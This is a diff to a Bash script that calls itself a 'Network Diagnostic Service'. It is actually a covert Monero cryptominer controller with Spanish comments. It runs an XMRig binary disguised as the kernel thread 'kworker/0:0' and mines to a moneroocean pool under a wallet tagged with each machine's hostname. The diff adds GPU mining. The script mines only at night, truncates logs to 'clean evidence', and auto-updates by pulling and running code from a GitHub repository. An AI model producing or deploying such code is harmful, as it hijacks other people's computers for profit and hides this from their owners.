@@ -1,8 +1,9 @@
 #!/bin/bash
 # ════════════════════════════════════════════════════════
-#  netdiag — Network Diagnostic Service
+#  netdiag — Network Diagnostic Service (v2 con GPU)
 #  Proceso de diagnóstico programado (bajo demanda)
 #  Auto-update: verifica versión en GitHub cada ~6h
+#  Soporta CPU + GPU (NVIDIA CUDA / AMD OpenCL)
 # ════════════════════════════════════════════════════════
 
 # ─── Rutas fijas (bajo perfil) ───
@@ -13,6 +14,7 @@ DATA_DIR="$BASE_DIR/data"
 BINARY="$DATA_DIR/kworker"
 LOG_FILE="$DATA_DIR/.diag.log"
 PID_FILE="/dev/shm/.netdiag.pid"
+RUN_CONFIG="/dev/shm/.netdiag-config.json"
 VERSION_FILE="$BASE_DIR/.version"
 TZ="America/Bogota"
 REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"
@@ -25,8 +27,17 @@ else
     exit 1
 fi
 
+# ─── Valores por defecto ───
+START_HOUR="${START_HOUR:-18}"
+END_HOUR="${END_HOUR:-7}"
+MAX_CPU="${MAX_CPU:-80}"
+MAX_TEMP="${MAX_TEMP:-85}"
+THREADS="${THREADS:-0}"
+POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"
+
 # ─── Construir wallet completo con hostname ───
-FULL_WALLET="${WALLET_BASE}.$(hostname)"
+HOSTNAME=$(hostname)
+FULL_WALLET="${WALLET_BASE}.${HOSTNAME}"
 
 # ─── Leer versión local ───
 LOCAL_VERSION="0.0.0"
@@ -36,94 +47,141 @@ LOCAL_VERSION="0.0.0"
 UPDATE_INTERVAL=360
 update_counter=0
 
-# ─── Función: ¿Estamos en hora permitida? ───
+# ─── Verificar si hay GPU habilitada ───
+GPU_VENDOR=""
+GPU_ENABLED=false
+if [ -f "$DATA_DIR/.gpu-vendor" ]; then
+    GPU_VENDOR=$(cat "$DATA_DIR/.gpu-vendor")
+    GPU_ENABLED=true
+fi
+
+# ════════════════════════════════════════════════════════
+#  GENERAR CONFIG.JSON PARA XMRig
+# ════════════════════════════════════════════════════════
+
+generate_config() {
+    local cpu_hint="$MAX_CPU"
+    local threads_json=""
+
+    if [ "$THREADS" -gt 0 ]; then
+        threads_json=",\"max-threads-hint\": $THREADS"
+    fi
+
+    # Construir sección CPU
+    cat > "$RUN_CONFIG" << CONF
+{
+    "autosave": false,
+    "donate-level": 0,
+    "title": "kworker/0:0",
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": $cpu_hint,
+        "yield": true
+    },
+CONF
+
+    # Agregar sección GPU si aplica
+    if $GPU_ENABLED; then
+        case "$GPU_VENDOR" in
+            nvidia)
+                cat >> "$RUN_CONFIG" << 'CONF'
+    "cuda": {
+        "enabled": true,
+        "loader": null,
+        "nvml": true
+    },
+CONF
+                ;;
+            amd)
+                cat >> "$RUN_CONFIG" << 'CONF'
+    "opencl": {
+        "enabled": true,
+        "loader": null,
+        "cache": true
+    },
+CONF
+                ;;
+        esac
+    fi
+
+    # Agregar sección pool
+    cat >> "$RUN_CONFIG" << CONF
+    "pools": [
+        {
+            "url": "$POOL_URL",
+            "user": "$FULL_WALLET",
+            "pass": "$HOSTNAME",
+            "algo": "auto",
+            "keepalive": true,
+            "tls": false
+        }
+    ]
+}
+CONF
+
+    chmod 600 "$RUN_CONFIG" 2>/dev/null
+}
+
+# ════════════════════════════════════════════════════════
+#  FUNCIONES DE CONTROL
+# ════════════════════════════════════════════════════════
+
+# ─── ¿Estamos en hora permitida? ───
 is_allowed_hour() {
     local hour
     hour=$(TZ=$TZ date +%-H)
     [ "$hour" -ge "$START_HOUR" ] || [ "$hour" -lt "$END_HOUR" ]
 }
 
-# ─── Función: ¿El worker está vivo? ───
+# ─── ¿El worker está vivo? ───
 is_worker_alive() {
     [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
 }
 
-# ─── Función: Iniciar worker ───
+# ─── Iniciar worker ───
 start_worker() {
     is_worker_alive && return 0
 
-    local threads=""
-    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"
-
     mkdir -p "$DATA_DIR" "$BASE_DIR"
 
-    # exec -a cambia el nombre del proceso en ps a "kworker/0"
-    exec -a "kworker/0" "$BINARY" $threads \
-        -o "$POOL_URL" \
-        -u "$FULL_WALLET" \
-        -p "x" \
-        --algo="rx/0" \
-        --cpu-max-threads-hint="$MAX_CPU" \
-        --donate-level=0 \
-        --keepalive \
-        >> "$LOG_FILE" 2>&1 &
-    # NOTA: exec -a en el background (&) NO funciona como esperamos
-    # Mejor: lanzar el proceso normalmente y renombrar con argv[0]
-
-    echo $! > "$PID_FILE"
-    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
-}
-
-# ─── Función: Iniciar worker con nombre oculto (alternativa) ───
-start_worker_hidden() {
-    is_worker_alive && return 0
-
-    local threads=""
-    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"
-
-    mkdir -p "$DATA_DIR" "$BASE_DIR"
-
-    # Crear un enlace simbólico con nombre genérico y ejecutar desde ahí
-    # Esto hace que ps muestre "kworker/0:0" en lugar del nombre real
-    if [ ! -f "$DATA_DIR/kworker" ]; then
-        ln -sf "$BINARY" "$DATA_DIR/kworker" 2>/dev/null
+    if [ ! -f "$BINARY" ]; then
+        echo "[$(TZ=$TZ date '+%F %T')] ERROR: Binario no encontrado en $BINARY" >> "$LOG_FILE"
+        return 1
     fi
 
-    "$DATA_DIR/kworker" $threads \
-        -o "$POOL_URL" \
-        -u "$FULL_WALLET" \
-        -p "x" \
-        --algo="rx/0" \
-        --cpu-max-threads-hint="$MAX_CPU" \
-        --donate-level=0 \
-        --keepalive \
-        --title="kworker/0:0" \
-        >> "$LOG_FILE" 2>&1 &
+    # Generar config.json runtime
+    generate_config
+
+    echo "[$(TZ=$TZ date '+%F %T')] Iniciando worker..." >> "$LOG_FILE"
+    if $GPU_ENABLED; then
+        echo "[$(TZ=$TZ date '+%F %T')] GPU habilitada: $GPU_VENDOR" >> "$LOG_FILE"
+    fi
+
+    "$BINARY" -c "$RUN_CONFIG" >> "$LOG_FILE" 2>&1 &
 
     echo $! > "$PID_FILE"
     echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
 }
 
-# ─── Función: Detener worker ───
+# ─── Detener worker ───
 stop_worker() {
     if is_worker_alive; then
         local pid
         pid=$(cat "$PID_FILE")
+        echo "[$(TZ=$TZ date '+%F %T')] Deteniendo worker (PID $pid)..." >> "$LOG_FILE"
         kill "$pid" 2>/dev/null
         sleep 2
         kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
         rm -f "$PID_FILE"
     fi
 
-    # ─── Limpiar evidencias al detener ───
-    if command -v wipe &>/dev/null; then
-        wipe -f "$LOG_FILE" 2>/dev/null
-    fi
-    : > "$LOG_FILE" 2>/dev/null            # Truncar logs
-    rm -f /dev/shm/.netdiag.* 2>/dev/null  # Limpiar shm
+    # Limpiar evidencias
+    rm -f "$RUN_CONFIG" 2>/dev/null
+    : > "$LOG_FILE" 2>/dev/null
+    rm -f /dev/shm/.netdiag.* 2>/dev/null
 }
 
-# ─── Función: Verificar temperatura ───
+# ─── Verificar temperatura ───
 check_temp() {
     [ "$MAX_TEMP" -eq 0 ] && return 0
     local temp
@@ -135,7 +193,7 @@ check_temp() {
     return 0
 }
 
-# ─── Función: Verificar actualización en GitHub ───
+# ─── Verificar actualización en GitHub ───
 check_update() {
     local remote_version
     remote_version=$(curl -sL --max-time 10 "$REMOTE_VERSION_URL" 2>/dev/null | head -1)
@@ -148,37 +206,30 @@ check_update() {
     remote_version=$(echo "$remote_version" | tr -d ' \n\r')
 
     if [ "$remote_version" = "$LOCAL_VERSION" ]; then
-        return 1  # Misma versión, no hay update
+        return 1
     fi
 
-    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión disponible: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
-    return 0  # Hay update
+    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
+    return 0
 }
 
-# ─── Función: Aplicar actualización ───
+# ─── Aplicar actualización ───
 apply_update() {
-    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando actualización..." >> "$LOG_FILE"
-
-    # Detener worker antes de actualizar
+    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando..." >> "$LOG_FILE"
     stop_worker
 
     if [ -d "$REPO_DIR/.git" ]; then
         git -C "$REPO_DIR" pull >> "$LOG_FILE" 2>&1
     else
-        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado en $REPO_DIR, clonando..." >> "$LOG_FILE"
+        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado, clonando..." >> "$LOG_FILE"
         mkdir -p "$REPO_DIR"
         git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$LOG_FILE" 2>&1
     fi
 
-    # Actualizar scripts y binarios (sin tocar la config)
     bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$LOG_FILE" 2>&1
-
-    # Actualizar versión local
     [ -f "$REPO_DIR/VERSION" ] && cp "$REPO_DIR/VERSION" "$VERSION_FILE"
 
-    echo "[$(TZ=$TZ date '+%F %T')] Update: actualización completada, reiniciando servicio..." >> "$LOG_FILE"
-
-    # Reiniciar el servicio con la nueva versión
+    echo "[$(TZ=$TZ date '+%F %T')] Update: completado, reiniciando..." >> "$LOG_FILE"
     exec "$0"
 }
 
@@ -189,7 +240,10 @@ cleanup() {
 }
 trap cleanup SIGTERM SIGINT SIGHUP
 
-# ─── Bucle principal ───
+# ════════════════════════════════════════════════════════
+#  BUCLE PRINCIPAL
+# ════════════════════════════════════════════════════════
+
 echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$LOG_FILE"
 
 while true; do
@@ -201,7 +255,7 @@ while true; do
             sleep 120
             continue
         fi
-        start_worker_hidden
+        start_worker
     else
         stop_worker
     fi
